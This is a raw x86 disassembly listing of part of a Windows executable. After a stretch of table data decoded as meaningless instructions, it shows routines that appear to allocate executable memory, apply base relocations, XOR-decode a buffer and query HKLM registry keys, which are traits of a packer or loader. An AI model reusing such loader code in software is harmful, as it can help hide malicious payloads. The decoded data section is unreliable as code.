  41acfb:	fiadd  WORD PTR [ecx+0x0]
  41acfe:	adc    al,0xde
  41ad00:	inc    ecx
  41ad01:	add    BYTE PTR [eax],bl
  41ad03:	fiadd  WORD PTR [ecx+0x0]
  41ad06:	sbb    al,0xde
  41ad08:	inc    ecx
  41ad09:	add    BYTE PTR [eax],ah
  41ad0b:	fiadd  WORD PTR [ecx+0x0]
  41ad0e:	and    al,0xde
  41ad10:	inc    ecx
  41ad11:	add    BYTE PTR [eax],ch
  41ad13:	fiadd  WORD PTR [ecx+0x0]
  41ad16:	sub    al,0xde
  41ad18:	inc    ecx
  41ad19:	add    BYTE PTR [eax],dh
  41ad1b:	fiadd  WORD PTR [ecx+0x0]
  41ad1e:	xor    al,0xde
  41ad20:	inc    ecx
  41ad21:	add    BYTE PTR [eax],bh
  41ad23:	fiadd  WORD PTR [ecx+0x0]
  41ad26:	adc    dh,bl
  41ad28:	inc    ecx
  41ad29:	add    BYTE PTR [esi+ebx*8],bh
  41ad2c:	inc    ecx
  41ad2d:	add    BYTE PTR [esi+ebx*8],ah
  41ad30:	inc    ecx
  41ad31:	add    BYTE PTR [eax-0x22],al
  41ad34:	inc    ecx
  41ad35:	add    al,bl
  41ad37:	fld    QWORD PTR [ecx+0x0]
  41ad3a:	inc    esp
  41ad3b:	fiadd  WORD PTR [ecx+0x0]
  41ad3e:	dec    eax
  41ad3f:	fiadd  WORD PTR [ecx+0x0]
  41ad42:	dec    esp
  41ad43:	fiadd  WORD PTR [ecx+0x0]
  41ad46:	push   eax
  41ad47:	fiadd  WORD PTR [ecx+0x0]
  41ad4a:	push   esp
  41ad4b:	fiadd  WORD PTR [ecx+0x0]
  41ad4e:	pop    eax
  41ad4f:	fiadd  WORD PTR [ecx+0x0]
  41ad52:	pop    esp
  41ad53:	fiadd  WORD PTR [ecx+0x0]
  41ad56:	adc    al,0xde
  41ad58:	inc    ecx
  41ad59:	add    BYTE PTR [eax-0x22],ah
  41ad5c:	inc    ecx
  41ad5d:	add    BYTE PTR [esi+ebx*8+0x41],ah
  41ad61:	add    BYTE PTR [eax-0x22],ch
  41ad64:	inc    ecx
  41ad65:	add    BYTE PTR [esi+ebx*8+0x41],ch
  41ad69:	add    BYTE PTR [eax-0x22],dh
  41ad6c:	inc    ecx
  41ad6d:	add    BYTE PTR [esi+ebx*8+0x41],dh
  41ad71:	add    BYTE PTR [eax-0x22],bh
  41ad74:	inc    ecx
  41ad75:	add    BYTE PTR [esi+ebx*8+0x41],bh
  41ad79:	add    BYTE PTR [eax-0x7bffbe22],al
  41ad7f:	fiadd  WORD PTR [ecx+0x0]
  41ad82:	or     al,0xde
  41ad84:	inc    ecx
  41ad85:	add    BYTE PTR [eax-0x73ffbe22],cl
  41ad8b:	fiadd  WORD PTR [ecx+0x0]
  41ad8e:	nop
  41ad8f:	fiadd  WORD PTR [ecx+0x0]
  41ad92:	sbb    ch,bl
  41ad94:	inc    ecx
  41ad95:	add    BYTE PTR [esi+ebx*8-0x224fffbf],dl
  41ad9c:	inc    ecx
  41ad9d:	add    BYTE PTR [ebp+ebx*8-0x2167ffbf],dh
  41ada4:	inc    ecx
  41ada5:	add    BYTE PTR [esi+ebx*8-0x21afffbf],bl
  41adac:	inc    ecx
  41adad:	add    BYTE PTR [eax-0x5bffbe22],ah
  41adb3:	fiadd  WORD PTR [ecx+0x0]
  41adb6:	test   al,0xde
  41adb8:	inc    ecx
  41adb9:	add    BYTE PTR [esi+ebx*8-0x214fffbf],ch
  41adc0:	inc    ecx
  41adc1:	add    BYTE PTR [esi+ebx*8-0x214bffbf],cl
  41adc8:	inc    ecx
  41adc9:	add    BYTE PTR [eax-0x43ffbe22],bh
  41adcf:	fiadd  WORD PTR [ecx+0x0]
  41add2:	rcr    dh,0x41
  41add5:	add    BYTE PTR [esi+ebx*8+0x41],dh
  41add9:	add    ah,al
  41addb:	fiadd  WORD PTR [ecx+0x0]
  41adde:	enter  0x41de,0x0
  41ade2:	int3   
  41ade3:	fiadd  WORD PTR [ecx+0x0]
  41ade6:	rcr    dh,1
  41ade8:	inc    ecx
  41ade9:	add    ah,dl
  41adeb:	fiadd  WORD PTR [ecx+0x0]
  41adee:	fcomp  st(6)
  41adf0:	inc    ecx
  41adf1:	add    ah,bl
  41adf3:	fiadd  WORD PTR [ecx+0x0]
  41adf6:	loopne 0x41add6
  41adf8:	inc    ecx
  41adf9:	add    ah,ah
  41adfb:	fiadd  WORD PTR [ecx+0x0]
  41adfe:	jo     0x41adde
  41ae00:	inc    ecx
  41ae01:	add    al,ch
  41ae03:	fiadd  WORD PTR [ecx+0x0]
  41ae06:	in     al,dx
  41ae07:	fiadd  WORD PTR [ecx+0x0]
  41ae0a:	lock fiadd WORD PTR [ecx+0x0]
  41ae0e:	hlt    
  41ae0f:	fiadd  WORD PTR [ecx+0x0]
  41ae12:	clc    
  41ae13:	fiadd  WORD PTR [ecx+0x0]
  41ae16:	cld    
  41ae17:	fiadd  WORD PTR [ecx+0x0]
  41ae1a:	add    bh,bl
  41ae1c:	inc    ecx
  41ae1d:	add    BYTE PTR [edi+ebx*8],al
  41ae20:	inc    ecx
  41ae21:	add    BYTE PTR [eax],cl
  41ae23:	fild   WORD PTR [ecx+0x0]
  41ae26:	or     al,0xdf
  41ae28:	inc    ecx
  41ae29:	add    al,bl
  41ae2b:	fld    QWORD PTR [ecx+0x0]
  41ae2e:	adc    bh,bl
  41ae30:	inc    ecx
  41ae31:	add    BYTE PTR [edi+ebx*8],dl
  41ae34:	inc    ecx
  41ae35:	add    BYTE PTR [eax],bl
  41ae37:	fild   WORD PTR [ecx+0x0]
  41ae3a:	sbb    al,0xdf
  41ae3c:	inc    ecx
  41ae3d:	add    BYTE PTR [eax],ah
  41ae3f:	fild   WORD PTR [ecx+0x0]
  41ae42:	and    al,0xdf
  41ae44:	inc    ecx
  41ae45:	add    BYTE PTR [eax],ch
  41ae47:	fild   WORD PTR [ecx+0x0]
  41ae4a:	sub    al,0xdf
  41ae4c:	inc    ecx
  41ae4d:	add    BYTE PTR [eax],ah
  41ae4f:	fiadd  WORD PTR [ecx+0x0]
  41ae52:	xor    bh,bl
  41ae54:	inc    ecx
  41ae55:	add    BYTE PTR [edi+ebx*8],dh
  41ae58:	inc    ecx
  41ae59:	add    BYTE PTR [eax],bh
  41ae5b:	fild   WORD PTR [ecx+0x0]
  41ae5e:	cmp    al,0xdf
  41ae60:	inc    ecx
  41ae61:	add    BYTE PTR [eax-0x21],al
  41ae64:	inc    ecx
  41ae65:	add    BYTE PTR [esi+ebx*8-0x20bbffbf],dl
  41ae6c:	inc    ecx
  41ae6d:	add    BYTE PTR [eax-0x22],al
  41ae70:	inc    ecx
  41ae71:	add    BYTE PTR [eax-0x21],cl
  41ae74:	inc    ecx
  41ae75:	add    BYTE PTR [eax+0xc0041dd],ch
  41ae7b:	fild   WORD PTR [ecx+0x0]
  41ae7e:	dec    esp
  41ae7f:	fild   WORD PTR [ecx+0x0]
  41ae82:	push   eax
  41ae83:	fild   WORD PTR [ecx+0x0]
  41ae86:	push   esp
  41ae87:	fild   WORD PTR [ecx+0x0]
  41ae8a:	xor    ch,bl
  41ae8c:	inc    ecx
  41ae8d:	add    BYTE PTR [eax-0x21],bl
  41ae90:	inc    ecx
  41ae91:	add    BYTE PTR [edi+ebx*8+0x41],bl
  41ae95:	add    BYTE PTR [eax-0x21],ah
  41ae98:	inc    ecx
  41ae99:	add    BYTE PTR [ebp+ebx*8-0x209bffbf],al
  41aea0:	inc    ecx
  41aea1:	add    BYTE PTR [eax-0x21],ch
  41aea4:	inc    ecx
  41aea5:	add    BYTE PTR [edi+ebx*8+0x41],ch
  41aea9:	add    BYTE PTR [eax-0x21],dh
  41aeac:	inc    ecx
  41aead:	add    BYTE PTR [edi+ebx*8+0x41],dh
  41aeb1:	add    BYTE PTR [eax],ch
  41aeb3:	fld    QWORD PTR [ecx+0x0]
  41aeb6:	js     0x41ae97
  41aeb8:	inc    ecx
  41aeb9:	add    BYTE PTR [edi+ebx*8+0x41],bh
  41aebd:	add    BYTE PTR [eax-0x7bffbe21],al
  41aec3:	fild   WORD PTR [ecx+0x0]
  41aec6:	mov    bh,bl
  41aec8:	inc    ecx
  41aec9:	add    BYTE PTR [edi+ebx*8-0x206fffbf],cl
  41aed0:	inc    ecx
  41aed1:	add    BYTE PTR [edi+ebx*8-0x2067ffbf],dl
  41aed8:	inc    ecx
  41aed9:	add    BYTE PTR [edi+ebx*8-0x205fffbf],bl
  41aee0:	inc    ecx
  41aee1:	add    BYTE PTR [edi+ebx*8-0x2057ffbf],ah
  41aee8:	inc    ecx
  41aee9:	add    BYTE PTR [edi+ebx*8-0x22e3ffbf],ch
  41aef0:	inc    ecx
  41aef1:	add    BYTE PTR [eax-0x4bffbe21],dh
  41aef7:	fild   WORD PTR [ecx+0x0]
  41aefa:	and    dh,bl
  41aefc:	inc    ecx
  41aefd:	add    BYTE PTR [eax-0x43ffbe21],bh
  41af03:	fild   WORD PTR [ecx+0x0]
  41af06:	je     0x41aee7
  41af08:	inc    ecx
  41af09:	add    al,al
  41af0b:	fild   WORD PTR [ecx+0x0]
  41af0e:	(bad)  
  41af0f:	fild   WORD PTR [ecx+0x0]
  41af12:	enter  0x41df,0x0
  41af16:	and    bh,bl
  41af18:	inc    ecx
  41af19:	add    ah,cl
  41af1b:	fild   WORD PTR [ecx+0x0]
  41af1e:	rcr    bh,1
  41af20:	inc    ecx
  41af21:	add    ah,dl
  41af23:	fild   WORD PTR [ecx+0x0]
  41af26:	fcomp  st(7)
  41af28:	inc    ecx
  41af29:	add    ah,al
  41af2b:	fild   WORD PTR [ecx+0x0]
  41af2e:	xchg   esp,eax
  41af2f:	fiadd  WORD PTR [ecx+0x0]
  41af32:	(bad)  
  41af34:	inc    ecx
  41af35:	add    al,ah
  41af37:	fild   WORD PTR [ecx+0x0]
  41af3a:	in     al,0xdf
  41af3c:	inc    ecx
  41af3d:	add    al,ch
  41af3f:	fild   WORD PTR [ecx+0x0]
  41af42:	clc    
  41af43:	fld    QWORD PTR [ecx+0x0]
  41af46:	jo     0x41af25
  41af48:	inc    ecx
  41af49:	add    ah,ch
  41af4b:	fild   WORD PTR [ecx+0x0]
  41af4e:	lock fild WORD PTR [ecx+0x0]
  41af52:	hlt    
  41af53:	fild   WORD PTR [ecx+0x0]
  41af56:	pushf  
  41af57:	fld    QWORD PTR [ecx+0x0]
  41af5a:	clc    
  41af5b:	fild   WORD PTR [ecx+0x0]
  41af5e:	cld    
  41af5f:	fild   WORD PTR [ecx+0x0]
  41af62:	(bad)  
  41af64:	inc    ecx
  41af65:	add    BYTE PTR [eax],al
  41af67:	loopne 0x41afaa
  41af69:	add    BYTE PTR [eax+eiz*8],al
  41af6c:	inc    ecx
  41af6d:	add    BYTE PTR [eax],cl
  41af6f:	loopne 0x41afb2
  41af71:	add    BYTE PTR [eax-0x23],dh
  41af74:	inc    ecx
  41af75:	add    BYTE PTR [eax+eiz*8],cl
  41af78:	inc    ecx
  41af79:	add    al,dl
  41af7b:	fld    QWORD PTR [ecx+0x0]
  41af7e:	adc    al,ah
  41af80:	inc    ecx
  41af81:	add    BYTE PTR [eax+eiz*8],dl
  41af84:	inc    ecx
  41af85:	add    BYTE PTR [eax],bl
  41af87:	loopne 0x41afca
  41af89:	add    BYTE PTR [eax+eiz*8],bl
  41af8c:	inc    ecx
  41af8d:	add    BYTE PTR [eax],ah
  41af8f:	loopne 0x41afd2
  41af91:	add    BYTE PTR [eax+eiz*8],ah
  41af94:	inc    ecx
  41af95:	add    BYTE PTR [ebx*8-0x2003ffbf],cl
  41af9c:	inc    ecx
  41af9d:	add    BYTE PTR [esi+ebx*8+0x41],dh
  41afa1:	add    BYTE PTR [eax],ch
  41afa3:	loopne 0x41afe6
  41afa5:	add    BYTE PTR [eax+eiz*8],ch
  41afa8:	inc    ecx
  41afa9:	add    BYTE PTR [eax],dh
  41afab:	loopne 0x41afee
  41afad:	add    BYTE PTR [eax+eiz*8],dh
  41afb0:	inc    ecx
  41afb1:	add    BYTE PTR [eax],bh
  41afb3:	loopne 0x41aff6
  41afb5:	add    BYTE PTR [eax+eiz*8],bh
  41afb8:	inc    ecx
  41afb9:	add    BYTE PTR [eax-0x20],al
  41afbc:	inc    ecx
  41afbd:	add    BYTE PTR [eax+eiz*8+0x41],al
  41afc1:	add    BYTE PTR [eax],cl
  41afc3:	fld    QWORD PTR [ecx+0x0]
  41afc6:	dec    eax
  41afc7:	loopne 0x41b00a
  41afc9:	add    BYTE PTR [eax+eiz*8+0x41],cl
  41afcd:	add    BYTE PTR [eax-0x20],dl
  41afd0:	inc    ecx
  41afd1:	add    ah,bl
  41afd3:	fild   WORD PTR [ecx+0x0]
  41afd6:	push   esp
  41afd7:	loopne 0x41b01a
  41afd9:	add    BYTE PTR [ebx*8-0x1fa7ffbf],bl
  41afe0:	inc    ecx
  41afe1:	add    ah,al
  41afe3:	fld    QWORD PTR [ecx+0x0]
  41afe6:	xchg   esp,eax
  41afe7:	fiadd  WORD PTR [ecx+0x0]
  41afea:	pop    esp
  41afeb:	loopne 0x41b02e
  41afed:	add    BYTE PTR [eax-0x20],ah
  41aff0:	inc    ecx
  41aff1:	add    BYTE PTR [eax+eiz*8+0x41],ah
  41aff5:	add    BYTE PTR [eax-0x20],ch
  41aff8:	inc    ecx
  41aff9:	add    BYTE PTR [eax+eiz*8+0x41],ch
  41affd:	add    BYTE PTR [eax-0x20],dh
  41b000:	inc    ecx
  41b001:	add    BYTE PTR [eax-0x23],al
  41b004:	inc    ecx
  41b005:	add    BYTE PTR [eax+eiz*8+0x41],dh
  41b009:	add    BYTE PTR [eax-0x20],bh
  41b00c:	inc    ecx
  41b00d:	add    BYTE PTR [eax+eiz*8+0x41],bh
  41b011:	add    BYTE PTR [eax-0x7bffbe20],al
  41b017:	loopne 0x41b05a
  41b019:	add    BYTE PTR [eax-0x73ffbe20],cl
  41b01f:	loopne 0x41b062
  41b021:	add    BYTE PTR [ebp+ebx*8+0x41],ah
  41b025:	add    BYTE PTR [eax-0x6bffbe20],dl
  41b02b:	loopne 0x41b06e
  41b02d:	add    BYTE PTR [eax-0x53ffbe20],bl
  41b033:	fiadd  WORD PTR [ecx+0x0]
  41b036:	pushf  
  41b037:	loopne 0x41b07a
  41b039:	add    BYTE PTR [eax+0x780041e0],ah
  41b03f:	fld    QWORD PTR [ecx+0x0]
  41b042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b043:	loopne 0x41b086
  41b045:	add    BYTE PTR [eax-0x22],dl
  41b048:	inc    ecx
  41b049:	add    BYTE PTR [eax-0x53ffbe20],ch
  41b04f:	loopne 0x41b092
  41b051:	add    BYTE PTR [eax-0x4bffbe20],dh
  41b057:	loopne 0x41b09a
  41b059:	add    BYTE PTR [eax-0x43ffbe20],bh
  41b05f:	loopne 0x41b0a2
  41b061:	add    BYTE PTR [eax-0x3fffbe23],dl
  41b067:	loopne 0x41b0aa
  41b069:	add    BYTE PTR [edi+ebx*8-0x1f3bffbf],bh
  41b070:	inc    ecx
  41b071:	add    al,cl
  41b073:	loopne 0x41b0b6
  41b075:	add    BYTE PTR [eax],dl
  41b077:	fld    QWORD PTR [ecx+0x0]
  41b07a:	int3   
  41b07b:	loopne 0x41b0be
  41b07d:	add    BYTE PTR [edi+ebx*8],bh
  41b080:	inc    ecx
  41b081:	add    al,dl
  41b083:	loopne 0x41b0c6
  41b085:	add    ah,dl
  41b087:	loopne 0x41b0ca
  41b089:	add    BYTE PTR [esi+ebx*8+0x41],dh
  41b08d:	add    BYTE PTR [eax-0x27ffbe20],ch
  41b093:	loopne 0x41b0d6
  41b095:	add    ah,bl
  41b097:	loopne 0x41b0da
  41b099:	add    ah,cl
  41b09b:	int3   
  41b09c:	int3   
  41b09d:	int3   
  41b09e:	int3   
  41b09f:	int3   
  41b0a0:	push   ebp
  41b0a1:	mov    ebp,esp
  41b0a3:	sub    esp,0xc
  41b0a6:	mov    DWORD PTR [ebp-0x8],0x1e4dc
  41b0ad:	mov    DWORD PTR [ebp-0xc],0x3000
  41b0b4:	mov    DWORD PTR [ebp-0x4],0x40
  41b0bb:	mov    eax,DWORD PTR [ebp-0x4]
  41b0be:	push   eax
  41b0bf:	mov    ecx,DWORD PTR [ebp-0xc]
  41b0c2:	push   ecx
  41b0c3:	mov    edx,DWORD PTR [ebp+0x8]
  41b0c6:	push   edx
  41b0c7:	push   0x0
  41b0c9:	call   DWORD PTR ds:0x41dcf0
  41b0cf:	mov    esp,ebp
  41b0d1:	pop    ebp
  41b0d2:	ret    
  41b0d3:	int3   
  41b0d4:	int3   
  41b0d5:	int3   
  41b0d6:	int3   
  41b0d7:	int3   
  41b0d8:	int3   
  41b0d9:	int3   
  41b0da:	int3   
  41b0db:	int3   
  41b0dc:	int3   
  41b0dd:	int3   
  41b0de:	int3   
  41b0df:	int3   
  41b0e0:	push   ebp
  41b0e1:	mov    ebp,esp
  41b0e3:	pop    ebp
  41b0e4:	ret    
  41b0e5:	int3   
  41b0e6:	int3   
  41b0e7:	int3   
  41b0e8:	int3   
  41b0e9:	int3   
  41b0ea:	int3   
  41b0eb:	int3   
  41b0ec:	int3   
  41b0ed:	int3   
  41b0ee:	int3   
  41b0ef:	int3   
  41b0f0:	push   ebp
  41b0f1:	mov    ebp,esp
  41b0f3:	sub    esp,0x8
  41b0f6:	mov    eax,DWORD PTR [ebp+0x8]
  41b0f9:	mov    DWORD PTR [ebp-0x4],eax
  41b0fc:	mov    ecx,DWORD PTR [ebp+0xc]
  41b0ff:	mov    DWORD PTR [ebp-0x8],ecx
  41b102:	mov    edx,DWORD PTR [ebp-0x4]
  41b105:	cmp    edx,DWORD PTR [ebp-0x8]
  41b108:	jae    0x41b111
  41b10a:	mov    eax,DWORD PTR [ebp-0x4]
  41b10d:	jmp    0x41b114
  41b10f:	jmp    0x41b114
  41b111:	mov    eax,DWORD PTR [ebp-0x8]
  41b114:	mov    esp,ebp
  41b116:	pop    ebp
  41b117:	ret    
  41b118:	int3   
  41b119:	int3   
  41b11a:	int3   
  41b11b:	int3   
  41b11c:	int3   
  41b11d:	int3   
  41b11e:	int3   
  41b11f:	int3   
  41b120:	push   ebp
  41b121:	mov    ebp,esp
  41b123:	push   ecx
  41b124:	push   0x41d000
  41b129:	push   0x41d018
  41b12e:	call   DWORD PTR ds:0x41dcf4
  41b134:	push   eax
  41b135:	call   DWORD PTR ds:0x41db60
  41b13b:	mov    DWORD PTR [ebp-0x4],eax
  41b13e:	push   0x104
  41b143:	push   0x420e5c
  41b148:	call   DWORD PTR [ebp-0x4]
  41b14b:	push   0x41d024
  41b150:	push   0x420e5c
  41b155:	call   DWORD PTR ds:0x41dcf8
  41b15b:	mov    DWORD PTR ds:0x420f60,0x401004
  41b165:	mov    esp,ebp
  41b167:	pop    ebp
  41b168:	ret    
  41b169:	int3   
  41b16a:	int3   
  41b16b:	int3   
  41b16c:	int3   
  41b16d:	int3   
  41b16e:	int3   
  41b16f:	int3   
  41b170:	push   ebp
  41b171:	mov    ebp,esp
  41b173:	mov    DWORD PTR ds:0x420f60,0x41a258
  41b17d:	pop    ebp
  41b17e:	ret    
  41b17f:	int3   
  41b180:	push   ebp
  41b181:	mov    ebp,esp
  41b183:	mov    eax,DWORD PTR [ebp+0x8]
  41b186:	mov    eax,DWORD PTR [eax-0x4]
  41b189:	pop    ebp
  41b18a:	ret    
  41b18b:	int3   
  41b18c:	int3   
  41b18d:	int3   
  41b18e:	int3   
  41b18f:	int3   
  41b190:	push   ebp
  41b191:	mov    ebp,esp
  41b193:	sub    esp,0xc
  41b196:	mov    DWORD PTR [ebp-0x4],0x0
  41b19d:	jmp    0x41b1a8
  41b19f:	mov    eax,DWORD PTR [ebp-0x4]
  41b1a2:	add    eax,0x1
  41b1a5:	mov    DWORD PTR [ebp-0x4],eax
  41b1a8:	mov    ecx,DWORD PTR [ebp-0x4]
  41b1ab:	cmp    ecx,DWORD PTR [ebp+0x8]
  41b1ae:	jae    0x41b1ff
  41b1b0:	mov    edx,DWORD PTR [ebp-0x4]
  41b1b3:	mov    eax,DWORD PTR [ebp+0xc]
  41b1b6:	movzx  ecx,WORD PTR [eax+edx*2]
  41b1ba:	sar    ecx,0xc
  41b1bd:	cmp    ecx,0x3
  41b1c0:	jne    0x41b1fd
  41b1c2:	mov    DWORD PTR [ebp-0xc],0xfff
  41b1c9:	mov    edx,DWORD PTR [ebp-0x4]
  41b1cc:	mov    eax,DWORD PTR [ebp+0xc]
  41b1cf:	movzx  ecx,WORD PTR [eax+edx*2]
  41b1d3:	and    ecx,DWORD PTR [ebp-0xc]
  41b1d6:	add    ecx,0x43
  41b1d9:	mov    DWORD PTR [ebp-0x8],ecx
  41b1dc:	mov    edx,DWORD PTR [ebp+0x18]
  41b1df:	mov    eax,DWORD PTR [ebp+0x10]
  41b1e2:	add    eax,DWORD PTR [edx]
  41b1e4:	mov    ecx,DWORD PTR [ebp-0x8]
  41b1e7:	mov    edx,DWORD PTR [eax+ecx*1-0x43]
  41b1eb:	add    edx,DWORD PTR [ebp+0x14]
  41b1ee:	mov    eax,DWORD PTR [ebp+0x18]
  41b1f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41b1f4:	add    ecx,DWORD PTR [eax]
  41b1f6:	mov    eax,DWORD PTR [ebp-0x8]
  41b1f9:	mov    DWORD PTR [ecx+eax*1-0x43],edx
  41b1fd:	jmp    0x41b19f
  41b1ff:	mov    esp,ebp
  41b201:	pop    ebp
  41b202:	ret    
  41b203:	int3   
  41b204:	int3   
  41b205:	int3   
  41b206:	int3   
  41b207:	int3   
  41b208:	int3   
  41b209:	int3   
  41b20a:	int3   
  41b20b:	int3   
  41b20c:	int3   
  41b20d:	int3   
  41b20e:	int3   
  41b20f:	int3   
  41b210:	push   ebp
  41b211:	mov    ebp,esp
  41b213:	sub    esp,0x24
  41b216:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41b21d:	mov    DWORD PTR [ebp-0x10],0x0
  41b224:	jmp    0x41b22f
  41b226:	mov    eax,DWORD PTR [ebp-0x10]
  41b229:	add    eax,0x4
  41b22c:	mov    DWORD PTR [ebp-0x10],eax
  41b22f:	mov    ecx,DWORD PTR [ebp-0x10]
  41b232:	cmp    ecx,DWORD PTR [ebp+0xc]
  41b235:	jae    0x41b2e1
  41b23b:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41b242:	cmp    DWORD PTR [ebp-0x10],0x0
  41b246:	jne    0x41b278
  41b248:	push   0x0
  41b24a:	push   0x80
  41b24f:	push   0x3
  41b251:	push   0x0
  41b253:	push   0x3
  41b255:	push   0x1
  41b257:	push   0x420e5c
  41b25c:	call   DWORD PTR ds:0x41dcfc
  41b262:	mov    DWORD PTR [ebp-0x4],eax
  41b265:	cmp    DWORD PTR [ebp-0x4],0xffffffff
  41b269:	je     0x41b271
  41b26b:	cmp    DWORD PTR [ebp-0x4],0x0
  41b26f:	jne    0x41b278
  41b271:	mov    eax,0x42
  41b276:	jmp    0x41b2e1
  41b278:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41b27f:	mov    edx,DWORD PTR [ebp-0x10]
  41b282:	add    edx,0x6f0
  41b288:	mov    DWORD PTR ds:0x420f64,edx
  41b28e:	mov    eax,DWORD PTR [ebp+0x8]
  41b291:	add    eax,DWORD PTR [ebp-0x10]
  41b294:	mov    ecx,DWORD PTR [eax]
  41b296:	add    ecx,DWORD PTR [ebp-0x10]
  41b299:	mov    edx,DWORD PTR [ebp+0x8]
  41b29c:	add    edx,DWORD PTR [ebp-0x10]
  41b29f:	mov    DWORD PTR [edx],ecx
  41b2a1:	mov    eax,DWORD PTR [ebp-0xc]
  41b2a4:	mov    DWORD PTR [ebp-0x14],eax
  41b2a7:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41b2ae:	mov    ecx,DWORD PTR ds:0x420f64
  41b2b4:	mov    DWORD PTR [ebp-0x24],ecx
  41b2b7:	mov    edx,DWORD PTR [ebp-0x24]
  41b2ba:	mov    DWORD PTR [ebp-0x20],edx
  41b2bd:	mov    eax,DWORD PTR [ebp-0x20]
  41b2c0:	mov    DWORD PTR [ebp-0x1c],eax
  41b2c3:	mov    ecx,DWORD PTR [ebp-0x1c]
  41b2c6:	mov    DWORD PTR [ebp-0x18],ecx
  41b2c9:	mov    edx,DWORD PTR [ebp+0x8]
  41b2cc:	add    edx,DWORD PTR [ebp-0x10]
  41b2cf:	mov    eax,DWORD PTR [edx]
  41b2d1:	xor    eax,DWORD PTR [ebp-0x18]
  41b2d4:	mov    ecx,DWORD PTR [ebp+0x8]
  41b2d7:	add    ecx,DWORD PTR [ebp-0x10]
  41b2da:	mov    DWORD PTR [ecx],eax
  41b2dc:	jmp    0x41b226
  41b2e1:	mov    esp,ebp
  41b2e3:	pop    ebp
  41b2e4:	ret    
  41b2e5:	int3   
  41b2e6:	int3   
  41b2e7:	int3   
  41b2e8:	int3   
  41b2e9:	int3   
  41b2ea:	int3   
  41b2eb:	int3   
  41b2ec:	int3   
  41b2ed:	int3   
  41b2ee:	int3   
  41b2ef:	int3   
  41b2f0:	push   ebp
  41b2f1:	mov    ebp,esp
  41b2f3:	sub    esp,0x14
  41b2f6:	mov    eax,DWORD PTR [ebp+0x8]
  41b2f9:	cmp    DWORD PTR [eax+0x4],0x0
  41b2fd:	je     0x41b347
  41b2ff:	mov    DWORD PTR [ebp-0x14],0x2a1
  41b306:	mov    ecx,DWORD PTR [ebp+0x8]
  41b309:	mov    edx,DWORD PTR [ecx+0x4]
  41b30c:	sub    edx,0x8
  41b30f:	shr    edx,1
  41b311:	mov    DWORD PTR [ebp-0xc],edx
  41b314:	mov    eax,DWORD PTR [ebp+0x8]
  41b317:	add    eax,0x8
  41b31a:	mov    DWORD PTR [ebp-0x10],eax
  41b31d:	mov    ecx,DWORD PTR [ebp+0x8]
  41b320:	push   ecx
  41b321:	mov    edx,DWORD PTR [ebp+0x10]
  41b324:	push   edx
  41b325:	mov    eax,DWORD PTR [ebp+0xc]
  41b328:	push   eax
  41b329:	mov    ecx,DWORD PTR [ebp-0x10]
  41b32c:	push   ecx
  41b32d:	mov    edx,DWORD PTR [ebp-0xc]
  41b330:	push   edx
  41b331:	call   0x41b190
  41b336:	add    esp,0x14
  41b339:	mov    eax,DWORD PTR [ebp+0x8]
  41b33c:	mov    ecx,DWORD PTR [ebp+0x8]
  41b33f:	add    ecx,DWORD PTR [eax+0x4]
  41b342:	mov    DWORD PTR [ebp+0x8],ecx
  41b345:	jmp    0x41b2f6
  41b347:	mov    esp,ebp
  41b349:	pop    ebp
  41b34a:	ret    
  41b34b:	int3   
  41b34c:	int3   
  41b34d:	int3   
  41b34e:	int3   
  41b34f:	int3   
  41b350:	push   ebp
  41b351:	mov    ebp,esp
  41b353:	xor    eax,eax
  41b355:	pop    ebp
  41b356:	ret    0x10
  41b359:	int3   
  41b35a:	int3   
  41b35b:	int3   
  41b35c:	int3   
  41b35d:	int3   
  41b35e:	int3   
  41b35f:	int3   
  41b360:	push   ebp
  41b361:	mov    ebp,esp
  41b363:	sub    esp,0x4d8
  41b369:	pusha  
  41b36a:	mov    DWORD PTR ds:0x420f68,ebp
  41b370:	mov    DWORD PTR [ebp-0x4a4],0x0
  41b37a:	mov    DWORD PTR [ebp-0x4b8],0x41d040
  41b384:	push   0x41d054
  41b389:	push   0x41d064
  41b38e:	call   DWORD PTR ds:0x41dcf4
  41b394:	push   eax
  41b395:	call   DWORD PTR ds:0x41db60
  41b39b:	mov    DWORD PTR [ebp-0x48c],eax
  41b3a1:	mov    DWORD PTR [ebp-0x8],0xe1d58000
  41b3a8:	mov    DWORD PTR [ebp-0x4],0x1a8e79f
  41b3af:	lea    eax,[ebp-0x4bc]
  41b3b5:	push   eax
  41b3b6:	lea    ecx,[ebp-0x4c0]
  41b3bc:	push   ecx
  41b3bd:	lea    edx,[ebp-0x8]
  41b3c0:	push   edx
  41b3c1:	call   DWORD PTR ds:0x41dd00
  41b3c7:	movzx  eax,WORD PTR [ebp-0x4c0]
  41b3ce:	cmp    eax,0x21
  41b3d1:	je     0x41b3da
  41b3d3:	xor    eax,eax
  41b3d5:	jmp    0x41b798
  41b3da:	lea    ecx,[ebp-0x468]
  41b3e0:	push   ecx
  41b3e1:	push   0x20019
  41b3e6:	push   0x0
  41b3e8:	push   0x420e54
  41b3ed:	push   0x80000002
  41b3f2:	call   DWORD PTR [ebp-0x48c]
  41b3f8:	test   eax,eax
  41b3fa:	je     0x41b403
  41b3fc:	xor    eax,eax
  41b3fe:	jmp    0x41b798
  41b403:	lea    edx,[ebp-0x468]
  41b409:	push   edx
  41b40a:	push   0x20019
  41b40f:	push   0x0
  41b411:	push   0x420e58
  41b416:	push   0x80000002
  41b41b:	call   DWORD PTR [ebp-0x48c]
  41b421:	test   eax,eax
  41b423:	je     0x41b42c
  41b425:	xor    eax,eax
  41b427:	jmp    0x41b798
  41b42c:	mov    eax,0x53
  41b431:	mov    ecx,DWORD PTR [ebp-0x4b8]
  41b437:	mov    WORD PTR [ecx],ax
  41b43a:	lea    edx,[ebp-0x468]
  41b440:	push   edx
  41b441:	push   0x20019
  41b446:	push   0x0
  41b448:	mov    eax,DWORD PTR [ebp-0x4b8]
  41b44e:	push   eax
  41b44f:	mov    ecx,DWORD PTR [ebp-0x468]
  41b455:	push   ecx
  41b456:	call   DWORD PTR [ebp-0x48c]
  41b45c:	test   eax,eax
  41b45e:	je     0x41b467
  41b460:	xor    eax,eax
  41b462:	jmp    0x41b798
  41b467:	lea    edx,[ebp-0x468]
  41b46d:	push   edx
  41b46e:	push   0x20019
  41b473:	push   0x0
  41b475:	push   0x41d070
  41b47a:	mov    eax,DWORD PTR [ebp-0x468]
